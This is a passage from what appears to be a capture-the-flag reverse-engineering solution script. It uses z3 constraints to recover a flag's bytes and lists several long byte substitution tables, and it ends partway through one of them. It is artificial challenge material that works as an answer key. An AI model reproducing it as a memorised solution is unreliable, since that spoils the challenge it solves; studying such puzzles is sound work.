x.add(dword_422000[0] == (203 * a1[3] \\ + 31 * a1[0] \\ + 11 * a1[14] \\ + 149 * a1[7] \\ + 215 * a1[5] \\ + 206 * a1[1] \\ + 245 * a1[6] \\ + 9 * a1[11] \\ + 16 * a1[10] \\ + 241 * a1[13] \\ + 110 * a1[8] \\ + 175 * a1[2] \\ + 38 * a1[4] \\ + 227 * a1[9] \\ + 208 * a1[12] \\ + 8 * a1[15])&amp;0xffffffff) x.add(dword_422000[2] == (132 * a1[3] \\ + 119 * a1[14] \\ + 26 * a1[8] \\ + 24 * a1[6] \\ + 121 * a1[11] \\ + 235 * a1[2] \\ + 228 * a1[12] \\ + 34 * a1[5] \\ + 37 * a1[15] \\ + 24 * a1[9] \\ + 145 * a1[13] \\ + 199 * a1[4] \\ + 173 * a1[10] \\ + 58 * a1[0] \\ + 246 * a1[7] \\ + 199 * a1[1])&amp;0xffffffff) assert x.check() == sat print(x.model()) flag[0] = 0x23 flag[33] = 0x21 flag[5] = 43 flag[11] = 186 flag[8] = 51 flag[16] = 72 flag[6] = 42 flag[4] = 51 flag[3] = 1 flag[10] = 179 flag[14] = 43 flag[7] = 186 flag[1] = 90 flag[13] = 113 flag[12] = 51 flag[2] = 45 flag[9] = 72 flag[15] = 114 by280 = [0x7A, 0x91, 0x9F, 0x23, 0x71, 0xD1, 0x63, 0xDB, 0x59, 0x0A, 0xEC, 0x69, 0xEE, 0x76, 0x5D, 0x64, 0x37, 0x42, 0x8C, 0x0B, 0x3C, 0x5C, 0x80, 0xAD, 0x6A, 0x03, 0x43, 0x93, 0xBC, 0xBF, 0xE3, 0xAF, 0x5A, 0x8A, 0x65, 0x0D, 0x31, 0xDF, 0x3E, 0xA7, 0xE4, 0xDD, 0xB4, 0xB0, 0x56, 0x1C, 0x12, 0xA4, 0x9E, 0xD8, 0x3D, 0x81, 0x60, 0x9A, 0xCB, 0xFA, 0xB1, 0xE0, 0xD3, 0xF4, 0xA2, 0x26, 0x68, 0x90, 0x4B, 0x45, 0x85, 0x20, 0x16, 0xDE, 0xED, 0x4C, 0x6F, 0x34, 0xDC, 0xBE, 0xD2, 0x46, 0x33, 0x14, 0x77, 0xC6, 0xCD, 0xF0, 0xC5, 0xAC, 0x1F, 0xD0, 0x95, 0x97, 0x3F, 0xD7, 0x52, 0xAE, 0xB9, 0xC9, 0x0C, 0xCA, 0x4E, 0xF1, 0xB7, 0x39, 0x7F, 0x27, 0x2B, 0x40, 0x4A, 0x51, 0xA1, 0xCC, 0xCE, 0x6E, 0x70, 0xFF, 0x0E, 0xEF, 0x8E, 0x25, 0xB3, 0x5E, 0x6C, 0xAB, 0x02, 0x49, 0xE9, 0x9B, 0x36, 0x13, 0x9C, 0x04, 0x35, 0xC0, 0xFB, 0x3A, 0x67, 0xB6, 0x9D, 0xC2, 0x73, 0xB5, 0x6D, 0xCF, 0x83, 0x2C, 0x01, 0xC1, 0x10, 0x6B, 0x79, 0x87, 0x5B, 0x57, 0x47, 0xE5, 0x15, 0xF7, 0xA5, 0x74, 0xAA, 0x53, 0x7D, 0x2E, 0xD5, 0xA3, 0x19, 0xF5, 0x2D, 0xFD, 0x61, 0x8D, 0xC8, 0x1B, 0xC3, 0xDA, 0xF6, 0x72, 0x54, 0x5F, 0x1E, 0xE8, 0x17, 0x50, 0xB2, 0xE7, 0x0F, 0x7E, 0x55, 0xBD, 0x86, 0x00, 0x78, 0x94, 0x92, 0x09, 0x2F, 0xD6, 0xD9, 0xF3, 0x29, 0xE6, 0x24, 0x32, 0x66, 0x22, 0x41, 0xC4, 0x7C, 0x05, 0x98, 0x44, 0x4F, 0x99, 0xA9, 0xE1, 0x8F, 0x08, 0x1A, 0x2A, 0x11, 0xEA, 0x3B, 0xE2, 0x38, 0xB8, 0x18, 0xF9, 0xD4, 0xC7, 0x62, 0x7B, 0x75, 0x58, 0x96, 0x28, 0xEB, 0x06, 0x84, 0x89, 0x48, 0x82, 0x88, 0xA6, 0xFE, 0xA0, 0xF2, 0xF8, 0x1D, 0x8B, 0xFC, 0xA8, 0x21, 0x30, 0xBB, 0x07, 0xBA, 0x4D] by380 = [0x45, 0x1F, 0x63, 0x81, 0xE6, 0xAD, 0x4F, 0xD3, 0xC0, 0x15, 0x69, 0x8F, 0x0D, 0x31, 0x0C, 0xB0, 0xF1, 0x2E, 0x98, 0xC1, 0xC2, 0x96, 0xB2, 0xEB, 0xBF, 0xDF, 0x17, 0xF4, 0x7F, 0xE5, 0x66, 0x73, 0xD8, 0x56, 0x46, 0x20, 0x9C, 0x77, 0x3D, 0x72, 0xA3, 0x91, 0x49, 0x68, 0x4C, 0x1E, 0xAE, 0x06, 0x7A, 0x94, 0xDD, 0x52, 0x55, 0x2C, 0xB8, 0x42, 0x79, 0xFE, 0x38, 0xEF, 0x8B, 0xF7, 0xAC, 0xDC, 0xFF, 0x78, 0x34, 0x70, 0xA9, 0xCE, 0x3F, 0x0E, 0x11, 0x43, 0x5B, 0xF8, 0xAF, 0xD0, 0xFA, 0x33, 0xBA, 0xCF, 0x4A, 0xC9, 0x88, 0x4E, 0x80, 0x10, 0x85, 0x37, 0x12, 0xAB, 0xE1, 0x61, 0xB7, 0x3E, 0x4D, 0x19, 0x3A, 0x04, 0x8C, 0x92, 0x0B, 0xE7, 0x3C, 0xEA, 0xC7, 0x16, 0x35, 0xB1, 0xA7, 0x8E, 0x40, 0x9F, 0xB6, 0xB5, 0x25, 0xA0, 0x5A, 0x30, 0x7D, 0xA2, 0x1A, 0x64, 0xC5, 0x6D, 0x74, 0x82, 0x08, 0x7E, 0xD2, 0xF6, 0xAA, 0xDA, 0xED, 0x4B, 0x6E, 0xE8, 0xE9, 0xE2, 0xD4, 0x71, 0xB9, 0x09, 0x84, 0x3B, 0xC4, 0x1C, 0x60, 0xFD, 0x22, 0x99, 0x39, 0x97, 0x18, 0x89, 0x7C, 0xA4, 0x27, 0xBD, 0x0F, 0xCC, 0x95, 0xF5, 0xB3, 0x65, 0x6B, 0x8A, 0x58, 0x36, 0xBB, 0x9E, 0x75, 0xD1, 0x03, 0x9D, 0x6A, 0x6C, 0x53, 0x05, 0xB4, 0xE4, 0xEE, 0x67, 0x87, 0x7B, 0x32, 0x2D, 0x24, 0x2A, 0x59, 0xEC, 0x0A, 0xDB, 0x21, 0x07, 0x23, 0x50, 0x02, 0x41, 0xF2, 0x83, 0xD9, 0x26, 0xBC, 0x6F, 0x86, 0xA6, 0x93, 0xF9, 0xC8, 0xD6, 0xA5, 0x1D, 0xE3, 0xE0, 0xFC, 0xCA, 0x1B, 0x5E, 0x8D, 0x2F, 0x5C, 0xBE, 0x47, 0xA8, 0x44, 0x57, 0x54, 0x48, 0xC3, 0x00, 0x62, 0x5D, 0xCB, 0xD7, 0x76, 0xCD, 0x28, 0xD5, 0x14, 0x90, 0x13, 0xDE, 0x5F, 0xF0, 0x01, 0x2B, 0xC6, 0x29, 0x9A, 0x9B, 0x51, 0xF3, 0xFB, 0xA1] by580 = [0x00, 0x74, 0x59, 0xC6, 0xAC, 0xD3, 0xC1, 0xA0, 0x88, 0x3F, 0x1C, 0x28, 0x17, 0x22, 0xC5, 0x38, 0xF9, 0x1B, 0x21, 0x49, 0x99, 0xAF, 0xD6, 0x95, 0xA4, 0x9D, 0x5D, 0x5B, 0x73, 0xFE, 0xC9, 0x9A, 0x4C, 0xB4, 0x27, 0x5E, 0x71, 0x25, 0xE2, 0x90, 0xC0, 0x62, 0x5F, 0x48, 0x77, 0xE0, 0xF2, 0x8E, 0x40, 0xC7, 0x79, 0x1A, 0xDC, 0xF3, 0x01, 0xB6, 0xD8, 0xB5, 0x67, 0x1E, 0x85, 0x12, 0x68, 0x87, 0xD0, 0x30, 0xEB, 0x2F, 0x50, 0xCF, 0xEE, 0xDD, 0xFB, 0xE6, 0xA5, 0x69, 0x05, 0x75, 0xB7, 0xEF, 0x70, 0x53, 0xFF, 0xBA, 0x80, 0x41, 0x9B, 0xA1, 0x39, 0xF8, 0x65, 0x1F, 0x7A, 0x51, 0x98, 0xAD, 0x02, 0x13, 0x18, 0xC3, 0x31, 0x89, 0xCD, 0xCA, 0x91, 0xD1, 0x78, 0x57, 0x47, 0xB8, 0x54, 0x9F, 0x96, 0x04, 0x23, 0x2B, 0xE5, 0x46, 0x29, 0x7C, 0x76, 0x82, 0xBC, 0xFC, 0x6E, 0xEC, 0xED, 0x64, 0x4A, 0x26, 0x34, 0x5C, 0x19, 0x55, 0xFD, 0x6D, 0xFA, 0x7E, 0xB2, 0xD4, 0xF1, 0xF6, 0xE4, 0x60, 0xB0, 0x52, 0x9E, 0x8F, 0xBB, 0x08, 0x3B, 0x97, 0xE8, 0x10, 0x6C, 0x44, 0x3A, 0x36, 0x35, 0x03, 0xC4, 0x81, 0x9C, 0xAB, 0xCB, 0x66, 0xAA, 0x37, 0xA2, 0xD2, 0xE1, 0xE9, 0x7B, 0x14, 0x8D, 0xD9, 0xF5, 0x0B, 0xC2, 0x07, 0xA8, 0x0D, 0xA3, 0x0A, 0x84, 0x6B, 0x2C, 0xEA, 0x0C, 0xAE, 0x7D, 0x6F, 0xD7, 0xE7, 0xC8, 0x3C, 0x45, 0xCC, 0x58, 0xB9, 0x3D, 0x33, 0x4E, 0x4B, 0x8C, 0xCE, 0x72, 0x6A, 0x8B, 0x2D, 0x24, 0x11, 0xDF, 0x5A, 0x2E, 0x92, 0xDA, 0x86, 0x94, 0xA7, 0xD5, 0x4F, 0x2A, 0xB3, 0x63, 0x61, 0xE3, 0xDE, 0x43, 0x1D, 0xBF, 0x15, 0x32, 0xBE, 0x16, 0x3E, 0x93, 0x7F, 0x83, 0x56, 0x06, 0xF7, 0x8A, 0x20, 0xBD, 0x0E, 0xA6, 0xDB, 0x0F, 0xB1, 0x42, 0xF0, 0x09, 0x4D, 0xA9, 0xF4] by780 = [0x0F, 0xA5, 0xBA, 0x03, 0xF9, 0x69, 0x2A, 0xD7, 0xEA, 0xB5, 0xFC, 0xA1, 0x39, 0x20, 0x68, 0x72, 0x25, 0xB2, 0x6C, 0xAD, 0x88, 0x51, 0x73, 0xEB, 0xCF, 0x13, 0xDE, 0x7C, 0x6D, 0x38, 0x05, 0x09, 0xC2, 0x96, 0x1F, 0x7F, 0x37, 0x4A, 0xC9, 0xE7, 0x6A, 0xB0, 0x59, 0xF7, 0xD2, 0xB9, 0x16, 0xC8, 0xEE, 0xA9, 0x18, 0x80, 0xAC, 0xE3, 0x9E, 0x6F, 0x3C, 0x2F, 0x3E, 0x9A, 0xBE, 0x1D, 0xB4, 0x7B, 0x7D, 0x32, 0x6B, 0x74, 0xC5, 0xC0, 0xC7, 0xD1, 0x29, 0x98, 0xDD, 0xB6, 0x0E, 0x4D, 0xBF, 0x79, 0x0D, 0xDA, 0x7A, 0x17, 0x71, 0x43, 0x87, 0xFF, 0xDC, 0xC6, 0x12, 0xE9, 0x67, 0x2D, 0x70, 0x9F, 0x95, 0x30, 0x26, 0x24, 0x2B, 0xA8, 0xA2, 0xD8, 0x3B, 0x31, 0xA0, 0x3D, 0x4B, 0x90, 0x60, 0x34, 0x75, 0xE8, 0x5D, 0xF4, 0x85, 0xF3, 0xFE, 0x35, 0xCB, 0xB8, 0x02, 0x50, 0xB1, 0xF1, 0x1A, 0x1B, 0x21, 0xCD, 0xC4, 0x7E, 0xED, 0x07, 0xD9, 0xD6, 0x44, 0x15, 0x8E, 0x49, 0xB3, 0x97, 0xE6, 0x63, 0xB7, 0xEF, 0x3A, 0x8F, 0xF2, 0x53, 0x10, 0x77, 0x86, 0xF8, 0x8A, 0x28, 0x3F, 0xD4, 0x4C, 0xE5, 0x82, 0x83, 0xEC, 0x62, 0x89, 0xDF, 0xC3, 0x14, 0xCA, 0xA3, 0x5F, 0x64, 0x47, 0xFD, 0x00, 0x84, 0x66, 0xA7, 0x5A, 0x0C, 0x01, 0xD5, 0x5B, 0x0A, 0x4F, 0x27, 0x78, 0x0B, 0x2E, 0x48, 0x36, 0xFA, 0x08, 0x56, 0xE0, 0xA6, 0xC1, 0x5C, 0x8B, 0x41, 0x06, 0xBB, 0x52, 0x93, 0xAF, 0x2C, 0x5E, 0xF6, 0x61, 0xF0, 0xAB, 0x91, 0x45, 0x04, 0xBD, 0xCC, 0xE4, 0x65, 0x9D, 0x92, 0xCE, 0x40, 0xAE, 0x76, 0x9B, 0x9C, 0xAA, 0x54, 0xD0, 0x1C, 0x81, 0x4E, 0x57, 0x55, 0x23, 0x6E, 0x1E, 0x99, 0xDB, 0xFB, 0xA4, 0x22, 0x19, 0x58, 0x11, 0x8D, 0x94, 0xD3, 0xE2, 0x8C, 0xF5, 0x42, 0x46, 0xBC, 0x33, 0xE1] byb80 = [0x38, 0xD9, 0xDA, 0xE6, 0xB5, 0xF1, 0x0B, 0x93, 0x0C, 0x58, 0x0D, 0xAE, 0x0A, 0x85, 0x2A, 0x50, 0xC2, 0xBF, 0xD4, 0x28, 0x52, 0xC4, 0x4F, 0xE1, 0x44, 0xE0, 0xA2, 0x70, 0x36, 0x65, 0x4B, 0x41, 0x9D, 0x5F, 0x05, 0x7C, 0xF7, 0xD7, 0x99, 0x8B, 0xCC, 0xCE, 0x16, 0xBE, 0xB6, 0xC5, 0x8F, 0x79, 0xC7, 0x20, 0x7E, 0xF4, 0xF3, 0x2E, 0x4A, 0x89, 0xD6, 0x0F, 0x6E, 0xB0, 0x61, 0xB1, 0x6D, 0x19, 0x73, 0x03, 0x74, 0xA1, 0x40, 0xEC, 0xC0, 0x57, 0x94, 0x7A, 0x66, 0xD5, 0xEA, 0x17, 0x6A, 0x84, 0x37, 0xED, 0xF6, 0x13, 0x31, 0x5B, 0x82, 0x1E, 0xFC, 0x92, 0xE2, 0x42, 0x86, 0xBA, 0xE3, 0x91, 0x7F, 0x67, 0x5C, 0x98, 0x15, 0x22, 0x8D, 0x80, 0x04, 0xE4, 0x25, 0x09, 0xA0, 0xAD, 0x63, 0xE5, 0xB4, 0x9A, 0x3C, 0xA3, 0x3A, 0x69, 0xF8, 0xCD, 0xBC, 0x88, 0x55, 0xB2, 0xBD, 0x6B, 0x77, 0x71, 0xB3, 0xD3, 0x90, 0x75, 0x06, 0x49, 0xC3, 0x32, 0x4D, 0x1D, 0xA8, 0xAA, 0xFB, 0x7B, 0x7D, 0x2B, 0xA6, 0x34, 0x72, 0x47, 0xF0, 0x2F, 0x9C, 0x08, 0x00, 0x14, 0x8C, 0x26, 0x5E, 0x87, 0xD1, 0xCF, 0xC9, 0x18, 0x51, 0x23, 0xCB, 0xF5, 0x1C, 0x9F, 0x97, 0xF9, 0xBB, 0xA7, 0x39, 0x45, 0x02, 0xFD, 0x46, 0x8A, 0x54, 0xA4, 0x8E, 0x9E, 0x68, 0x96, 0x0E, 0x78, 0xB8, 0x3D, 0x11, 0x64, 0xAF, 0x10, 0xDE, 0x6C, 0x60, 0x5A, 0x76, 0x1A, 0xE9, 0xC1, 0x3E, 0xCA, 0x9B, 0x27, 0x30, 0xEF, 0xFF, 0x07, 0xD2, 0xB9, 0x2D, 0xD0, 0xEE, 0x83, 0xAB, 0xF2, 0x4C, 0xA5, 0x21, 0x62, 0x81, 0x33, 0x1B, 0xD8, 0x6F, 0xAC, 0x3B, 0x5D, 0xE8, 0xFA, 0x3F, 0xDB, 0x95, 0xE7, 0x59, 0x12, 0x48, 0x35, 0xC6, 0x2C, 0x4E, 0x01, 0xDD, 0x43, 0x29, 0xDC, 0x24, 0x1F, 0xB7, 0xA9, 0xEB, 0xC8, 0xFE, 0x56, 0xDF, 0x53] byd80 = [0xB0, 0x28, 0x0B, 0x89, 0x4B, 0xA4, 0xBE, 0x1A, 0x8F, 0x6C, 0xCF, 0xB2, 0xB5, 0xFE, 0xFB, 0x59, 0x2D, 0x29, 0x39, 0x62, 0x97, 0xAA, 0xD7, 0x7D, 0x94, 0x2C, 0xFC, 0x5D, 0xB4, 0x7C, 0x8A, 0x82, 0xD3, 0xA7, 0xBA, 0xDF, 0x21, 0xE6, 0xA2, 0xD0, 0xE8, 0xF0, 0x67, 0x3A, 0xB9, 0x98, 0xF9, 0xAE, 0xD1, 0x56, 0xD8, 0xCA, 0x10, 0xEA, 0x92, 0xA8, 0x75, 0x7E, 0x65, 0xA9, 0xAF, 0x51, 0xC9, 0x8E, 0xD4, 0x77, 0xE4, 0x49, 0x06, 0x61, 0x9E, 0x24, 0xD9, 0x9B, 0x11, 0x05, 0x1D, 0x96, 0x9A, 0xB1, 0xE0, 0x83, 0xE1, 0x1C, 0xCD, 0xF3, 0x38, 0xB3, 0x57, 0x50, 0xF4, 0xAC, 0xEB, 0x14, 0xA5, 0x46, 0xF6, 0x93, 0xAD, 0x7B, 0x30, 0xEF, 0x79, 0x17, 0x47, 0xDA, 0xC0, 0xDD, 0xDE, 0xDC, 0x5A, 0x76, 0x3B, 0x31, 0x0D, 0x0E, 0x86, 0xF1, 0x71, 0xFA, 0x0C, 0x00, 0xA3, 0xBF, 0x64, 0x37, 0x22, 0xD2, 0x69, 0x5C, 0xC6, 0x16, 0x9F, 0x5E, 0x7A, 0x1E, 0x27, 0x60, 0x6E, 0xF8, 0x8C, 0xEE, 0xC2, 0x74, 0x81, 0x8B, 0x33, 0x03, 0xBD, 0x2A, 0x0A, 0x68, 0x6B, 0x3F, 0x4C, 0xC3, 0x15, 0x04, 0x3D, 0x63, 0xF5, 0xAB, 0xCC, 0x3C, 0x53, 0x20, 0x66, 0xC4, 0xC1, 0x23, 0xE7, 0x25, 0x55, 0xC7, 0xED, 0xB7, 0xBC, 0xCB, 0x8D, 0x09, 0xCE, 0x52, 0xBB, 0xE2, 0xC5, 0xB6, 0x26, 0x12, 0x2F, 0x99, 0x58, 0x40, 0x6D, 0xA1, 0x3E, 0x48, 0x85, 0xA6, 0xF2, 0x0F, 0x43, 0x78, 0xB8, 0x01, 0xE5, 0xD5, 0x6F, 0x4E, 0xF7, 0x13, 0x42, 0xEC, 0x45, 0x2B, 0x4F, 0x36, 0xDB, 0x9C, 0xE3, 0x44, 0x34, 0x84, 0x73, 0x2E, 0x7F, 0xFD, 0x91, 0x41, 0xD6, 0x95, 0x18, 0xFF, 0x70, 0xC8, 0x02, 0x5F, 0x08, 0x1B, 0x6A, 0x5B, 0x19, 0xA0, 0x4D, 0x35, 0x54, 0xE9, 0x32, 0x88, 0x72, 0x07, 0x87, 0x90, 0x4A, 0x80, 0x1F, 0x9D] by1180 = [0xE8, 0x22, 0x64, 0x9F, 0xC5, 0xD5, 0x25, 0xC9, 0x5D, 0xDF, 0xA1, 0x74, 0xCB, 0x57, 0xF7, 0xF0, 0xBD, 0x56, 0xFF, 0x33, 0x79, 0xFE, 0x87, 0xB6, 0xB1, 0x54, 0x10, 0x95, 0x8A, 0xEC, 0x7B, 0x48, 0x84, 0x3D, 0x30, 0xEF, 0x86, 0xFA, 0x97, 0x1C, 0xDC, 0xA9, 0x5A, 0xF3, 0x67, 0x18, 0x83, 0x72, 0x06, 0xB9, 0xF5, 0x05, 0x68, 0x59, 0xF2, 0xE4, 0x88, 0x5E, 0x14, 0x17, 0x11, 0x9C, 0xAB, 0xDE, 0xEB, 0x7D, 0x62, 0x9B, 0xD6, 0xF4, 0x01, 0x29, 0xBC, 0xC0, 0x69, 0xA2, 0x2B, 0x0D, 0x1D, 0x98, 0x6A, 0xBE, 0x65, 0x09, 0xF8, 0x96, 0xB4, 0x6E, 0x63, 0xE3, 0x34, 0x2D, 0xCE, 0x0A, 0xCD, 0xAA, 0x21, 0xCC, 0xE7, 0xA5, 0xDB, 0xD8, 0x03, 0xDD, 0xB2, 0x1F, 0x9D, 0x9E, 0x0E, 0x8F, 0x8B, 0xCA, 0x92, 0x0B, 0xA7, 0x5B, 0xD2, 0xCF, 0x47, 0x07, 0x04, 0xAE, 0x3B, 0xA8, 0x7C, 0x73, 0xF9, 0x35, 0xEE, 0x7A, 0xB0, 0xBA, 0x85, 0x46, 0x3E, 0x81, 0xC7, 0x40, 0x37, 0x15, 0x3A, 0x19, 0xE0, 0x1E, 0x28, 0x4A, 0x4F, 0x8C, 0xD4, 0x51, 0x2E, 0x94, 0x89, 0x2A, 0x0F, 0x7E, 0xE1, 0xC8, 0x5F, 0x4E, 0x6D, 0xF6, 0x49, 0xB8, 0x55, 0x60, 0x82, 0x20, 0x36, 0xC1, 0x0C, 0x1B, 0xC4, 0x00, 0xE5, 0xA3, 0x2C, 0xE9, 0xC2, 0xF1, 0x23, 0x3F, 0xC3, 0xB5, 0x8D, 0xD7, 0x42, 0xFC, 0x50, 0x13, 0xBB, 0x61, 0x9A, 0x44, 0xE6, 0x91, 0x2F, 0x70, 0xC6, 0x6F, 0xD1, 0x27, 0x43, 0x08, 0xDA, 0xFD, 0x52, 0x71, 0x77, 0xED, 0xE2, 0xAD, 0x16, 0x8E, 0x12, 0x4C, 0x31, 0x3C, 0x39, 0x78, 0x90, 0xBF, 0x1A, 0x76, 0x75, 0x41, 0x99, 0xD0, 0x80, 0xB7, 0x66, 0x24, 0xD3, 0x7F, 0x4B, 0x45, 0x5C, 0x53, 0x4D, 0x26, 0x32, 0xA0, 0xFB, 0xB3, 0x38, 0x6B, 0xAF, 0xA6, 0xD9, 0x02, 0xA4, 0xEA, 0x6C, 0xAC, 0x58, 0x93] by1380 = [0x91, 0x67, 0x1A, 0xBE, 0xAB, 0xC2, 0x85, 0xD5, 0xDA, 0xCC, 0xF7, 0x5B, 0x54, 0x61, 0x05, 0xDF, 0x02, 0x70, 0x65, 0x69, 0x9A, 0x7A, 0x09, 0x92, 0x5D, 0x2A, 0xA7, 0x37, 0xFF, 0x19, 0xE6, 0x99, 0xF3, 0x1E, 0xBD, 0x82, 0x48, 0x3C, 0xE8, 0xC8, 0x66, 0x17, 0xB7, 0xA9, 0xC5, 0x4E, 0x33, 0x84, 0x45, 0xD3, 0x8B, 0x49, 0x50, 0x43, 0x8F, 0xCD, 0x73, 0x29, 0x04, 0xDC, 0x01, 0x0C, 0xDD, 0x2E, 0xFB, 0x6E, 0x0F, 0x24, 0x57, 0xE9, 0xC9, 0x7D, 0xB3, 0x40, 0x4B, 0x56, 0x6C, 0x68, 0xE2, 0x22, 0xF6, 0x80, 0xAA, 0x95, 0xD4, 0x97, 0x94, 0x21, 0x53, 0xD1, 0xE3, 0x59, 0xD2, 0xED, 0x41, 0x4D, 0x74, 0xA3, 0xA0, 0x32, 0x0D, 0xFC, 0x46, 0x34, 0xFA, 0xB1, 0x5E, 0xC6, 0x71, 0xC0, 0xE0, 0x3F, 0x13, 0x12, 0xD7, 0xEE, 0xF8, 0x26, 0xE1, 0x25, 0x88, 0x77, 0xB0, 0x8D, 0x6A, 0xEA, 0x0E, 0xD6, 0x3E, 0x03, 0x64, 0xBF, 0x8C, 0x96, 0xD9, 0xA4, 0x42, 0xAD, 0xFD, 0x16, 0x5A, 0xE4, 0x06, 0x9D, 0x07, 0x87, 0x5F, 0xAF, 0xDB, 0xC1, 0x93, 0x1C, 0xF1, 0xDE, 0xA6, 0x3A, 0xF4, 0x2C, 0x1B, 0x39, 0xE7, 0x4A, 0xC7, 0x35, 0xFE, 0x0A, 0x62, 0xF0, 0xCA, 0xEC, 0x27, 0x52, 0x23, 0x7F, 0xA5, 0x79, 0x7C, 0x75, 0x86, 0xEB, 0x60, 0xA8, 0xF5, 0x1F, 0x20, 0xC3, 0x63, 0x5C, 0x72, 0x18, 0xE5, 0x51, 0xAC, 0xB9, 0x90, 0x9F, 0x4C, 0xB2, 0xCB, 0x00, 0x6F, 0x28, 0xA1, 0xB6, 0x9B, 0xD0, 0x7B, 0x36, 0x4F, 0x9C, 0xCF, 0x98, 0x8A, 0x0B, 0x78, 0xB4, 0x7E, 0x2B, 0xEF, 0x58, 0xB5, 0xBA, 0x55, 0xB8, 0x10, 0x2F, 0x44, 0xAE, 0x89, 0x08, 0xC4, 0x3B, 0x9E, 0xF9, 0x6D, 0xF2, 0x15, 0x1D, 0x30, 0x47, 0x8E, 0x31, 0x2D, 0xD8, 0x6B, 0x3D, 0x11, 0x14, 0xA2, 0x83, 0xCE, 0xBB, 0x81, 0xBC, 0x76, 0x38] by1780 = [0x38, 0x5A, 0xC7, 0x98, 0x15, 0x6A, 0xC9, 0x28, 0x33, 0xEA, 0xF4, 0xD9, 0xDB, 0x77, 0xB8, 0x49, 0x1B, 0x79, 0xF5, 0xFD, 0x3E, 0xA2, 0xDE, 0x17, 0xC4, 0x5E, 0xE5, 0x11, 0xB6, 0x1D, 0x86, 0xF9, 0x90, 0x78, 0x8A, 0x14, 0x12, 0xB1, 0xC2, 0x21, 0xF1, 0x02, 0x58, 0xA1, 0x23, 0x0C, 0xAD, 0xA5, 0x50, 0x48, 0x1E, 0x6D, 0xF8, 0x96, 0x9D, 0x19, 0x00, 0xBD, 0x26, 0xCE, 0xA7, 0x24, 0x2E, 0x39, 0x7B, 0xFA, 0x5F, 0xCC, 0x1A, 0x0B, 0x40, 0x0F, 0x4B, 0x82, 0xE2, 0x97, 0x10, 0x2A, 0xFC, 0x3B, 0xB2, 0x66, 0x27, 0x54, 0x07, 0xE3, 0x08, 0xA3, 0xA6, 0xED, 0x62, 0x13, 0x9C, 0x20, 0x01, 0x92, 0xE8, 0xAE, 0xBE, 0xE1, 0x0A, 0x41, 0x94, 0x80, 0xA9, 0x2F, 0x29, 0x70, 0x35, 0x16, 0xF7, 0x6B, 0xFE, 0x9E, 0x0D, 0xD3, 0x7F, 0x1F, 0xA0, 0x32, 0xD2, 0x52, 0x05, 0x76, 0x89, 0x9B, 0x7A, 0x8F, 0x99, 0xEF, 0xCF, 0x51, 0x0E, 0xEC, 0x59, 0x5C, 0x37, 0xD5, 0x8E, 0x31, 0x34, 0x2D, 0x93, 0x25, 0x1C, 0xC8, 0x5B, 0x47, 0x9F, 0x03, 0x67, 0x7E, 0x42, 0x7D, 0x3A, 0xAA, 0x57, 0xDA, 0x9A, 0xAB, 0x74, 0x72, 0xE4, 0xB7, 0x5D, 0xCD, 0x87, 0x46, 0x2B, 0x43, 0xF3, 0xD0, 0x85, 0x55, 0xBB, 0xD4, 0xC6, 0x61, 0x56, 0x04, 0x65, 0x7C, 0x88, 0xC3, 0x73, 0xBC, 0xEB, 0xDD, 0x4D, 0xE0, 0xE6, 0xC0, 0x63, 0x8D, 0xF2, 0x81, 0xF6, 0xA8, 0x3D, 0x3F, 0xA4, 0xE9, 0x4A, 0xB5, 0xF0, 0xCA, 0x8B, 0x2C, 0xD7, 0xAC, 0xC5, 0xC1, 0xBF, 0x53, 0xD1, 0x6F, 0x06, 0xE7, 0xD6, 0x09, 0x95, 0x44, 0x71, 0xB9, 0x83, 0x4C, 0x22, 0xAF, 0xB4, 0x75, 0x36, 0x30, 0xCB, 0xEE, 0x91, 0x45, 0x8C, 0x4E, 0x6E, 0x6C, 0x4F, 0x84, 0xBA, 0xFF, 0x64, 0xB3, 0x60, 0xFB, 0xB0, 0x18, 0xD8, 0xDF, 0x3C, 0x68, 0xDC, 0x69] by1d80 = [0xD1, 0x9C, 0x68, 0xC0, 0x13, 0xAC, 0x48, 0x32, 0xA3, 0xBA, 0x4C, 0xE7, 0x6D, 0xC8, 0x1C, 0xAB, 0xE2, 0x7A, 0x42, 0xE1, 0x7B, 0x16, 0x67, 0x03, 0xAE, 0x7E, 0xAA, 0x38, 0x22, 0x02, 0x39, 0x51, 0xC7, 0x79, 0xD7, 0xCB, 0xEF, 0x62, 0x98, 0xDC, 0x53, 0x72, 0x89, 0xA5, 0x4B, 0xC6, 0x86, 0xF6, 0xFC, 0x77, 0x5A, 0xF5, 0x2E, 0x3D, 0xB2, 0xFE, 0x59, 0x27, 0x80, 0x63, 0xDD, 0x1A, 0x12, 0x5E, 0xED, 0xB0, 0xBC, 0xC4, 0x5F, 0x11, 0xC9, 0x09, 0xC5, 0x75, 0x96, 0x0A, 0x2F, 0x00, 0x17, 0x81, 0x14, 0x47, 0xBB, 0x9D, 0x8E, 0x3C, 0xD6, 0xA1, 0xE0, 0xA2, 0x26, 0x5D, 0x08, 0x6E, 0x4E, 0xF1, 0xCF, 0x73, 0x8A, 0x90, 0x0B, 0xB3, 0x3E, 0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 